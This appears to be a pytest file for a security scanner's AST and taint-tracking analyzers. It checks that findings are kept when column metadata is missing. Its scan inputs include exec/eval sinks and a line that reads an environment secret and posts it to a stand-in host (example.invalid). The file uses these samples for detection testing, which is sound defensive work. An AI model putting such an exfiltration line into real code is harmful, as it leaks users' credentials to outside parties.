# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Instrumented AST metadata must reduce location precision, not lose findings.

Ordinary ast.parse supplies columns. These tests deliberately alter its output;
the synthetic Python inputs are scan data and are never executed.
"""

from __future__ import annotations

import ast

import pytest

from skillspector.nodes.analyzers import behavioral_ast, behavioral_taint_tracking

_COLUMN_STATES = ("normal", "null", "absent")


def _instrument_columns(monkeypatch, source, start_state, end_state):
    original_parse = ast.parse
    parsed_calls = []

    def parse_with_optional_columns(content, *args, **kwargs):
        tree = original_parse(content, *args, **kwargs)
        if content == source:
            parsed_calls.append(tree)
            for node in ast.walk(tree):
                if isinstance(node, ast.Call):
                    for attribute, state in (
                        ("col_offset", start_state),
                        ("end_col_offset", end_state),
                    ):
                        if state == "null":
                            setattr(node, attribute, None)
                        elif state == "absent":
                            delattr(node, attribute)
        return tree

    monkeypatch.setattr(ast, "parse", parse_with_optional_columns)
    return parsed_calls


@pytest.mark.parametrize("start_state", _COLUMN_STATES)
@pytest.mark.parametrize("end_state", _COLUMN_STATES)
@pytest.mark.parametrize(
    "analyzer,rule,source,start_line,end_line,start_column,end_column,exact_match",
    [
        (behavioral_ast, "AST1", 'exec("payload")\n', 1, 1, 0, 15, 'exec("payload")'),
        (
            behavioral_taint_tracking,
            "TT5",
            "command = input()\neval(command)\n",
            2,
            2,
            0,
            13,
            "eval(command)",
        ),
        (
            behavioral_ast,
            "AST1",
            'label = "🦄"; exec(\n    "payload"\n)\n',
            1,
            3,
            13,
            1,
            'exec(\n    "payload"\n)',
        ),
        (
            behavioral_taint_tracking,
            "TT5",
            'command = input()\nlabel = "🦄"; eval(\n    command\n)\n',
            2,
            4,
            13,
            1,
            "eval(\n    command\n)",
        ),
    ],
    ids=["ast", "taint", "ast-unicode-multiline", "taint-unicode-multiline"],
)
def test_optional_columns_retain_findings_and_source(
    monkeypatch,
    start_state,
    end_state,
    analyzer,
    rule,
    source,
    start_line,
    end_line,
    start_column,
    end_column,
    exact_match,
):
    parsed_calls = _instrument_columns(monkeypatch, source, start_state, end_state)

    result = analyzer.node({"components": ["script.py"], "file_cache": {"script.py": source}})

    assert len(parsed_calls) == 1
    findings = [finding for finding in result["findings"] if finding.rule_id == rule]
    assert len(findings) == 1
    finding = findings[0]
    assert finding.file == "script.py"
    assert finding.start_line == start_line
    assert finding.end_line == end_line
    assert finding.start_column == (start_column if start_state == "normal" else None)
    assert finding.end_column == (end_column if end_state == "normal" else None)
    source_lines = "\n".join(source.splitlines()[start_line - 1 : end_line])
    expected_match = exact_match if start_state == end_state == "normal" else source_lines
    assert finding.matched_text == expected_match
    assert source.splitlines()[start_line - 1] in finding.context
    location = finding.to_dict()["location"]
    assert ("start_column" in location) == (start_state == "normal")
    assert ("end_column" in location) == (end_state == "normal")


@pytest.mark.parametrize("column_state", ["null", "absent"])
def test_taint_sinks_without_columns_remain_distinct(monkeypatch, column_state):
    # Multiple source flows into one sink still emit one finding, but separate
    # sink nodes on the same line must not collapse when their columns vanish.
    call = (
        'requests.post("https://example.invalid", data=secret, headers={"X": os.getenv("OTHER")})'
    )
    source = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'
    parsed_calls = _instrument_columns(monkeypatch, source, column_state, column_state)

    result = behavioral_taint_tracking.node(
        {"components": ["script.py"], "file_cache": {"script.py": source}}
    )

    assert len(parsed_calls) == 1
    findings = [finding for finding in result["findings"] if finding.rule_id == "TT3"]
    assert len(findings) == 2
    assert all(finding.start_line == 3 and finding.end_line == 3 for finding in findings)
    assert all(finding.start_column is None and finding.end_column is None for finding in findings)
